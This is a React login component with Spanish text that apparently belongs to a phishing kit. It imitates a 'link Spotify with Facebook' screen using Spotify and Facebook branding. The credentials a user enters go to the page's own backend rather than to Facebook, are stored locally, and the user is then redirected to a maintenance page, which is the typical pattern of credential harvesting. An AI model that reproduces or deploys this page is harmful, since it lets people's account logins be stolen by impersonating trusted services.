import { useState } from 'react'
import LoginForm from './LoginForm'
import Footer from './Footer'
import './Login.css'

const Login = () => {
  const [message, setMessage] = useState('')

  const handleLogin = async (credentials) => {
    try {
      // Petición al backend
      const response = await fetch('http://localhost:3001/api/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(credentials),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.message || 'Credenciales inválidas')
      }

      // Login exitoso - guardar datos en localStorage
      localStorage.setItem('user', JSON.stringify(data.data))
      
      // Redirigir a página de mantenimiento
      window.location.href = '/maintenance'
      
    } catch (error) {
      throw new Error(error.message || 'Error al iniciar sesión')
    }
  }

  return (
    <div className="login-container">
      <div className="login-content">
        <div className="login-wrapper">
          <div className="login-left">
            <div className="integration-header">
              <div className="logo-container">
                <svg className="spotify-logo" viewBox="0 0 24 24" fill="#1DB954" width="48" height="48">
                  <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/>
                </svg>
                <span className="integration-arrow">→</span>
                <div className="fb-logo-text">facebook</div>
              </div>
              <h1 className="integration-title">Vincular cuenta de Spotify con Facebook</h1>
              <p className="integration-description">
                Inicia sesión en Facebook para conectar tu cuenta de Spotify y compartir música con tus amigos.
              </p>
            </div>
          </div>

          <div className="login-card">
            <LoginForm onSubmit={handleLogin} />

            {message && (
              <div className="message-box">
                {message}
              </div>
            )}
          </div>
        </div>
      </div>

      <Footer />

      <div className="background-decoration">
        <div className="circle circle-1"></div>
        <div className="circle circle-2"></div>
        <div className="circle circle-3"></div>
      </div>
    </div>
  )
}

export default Login
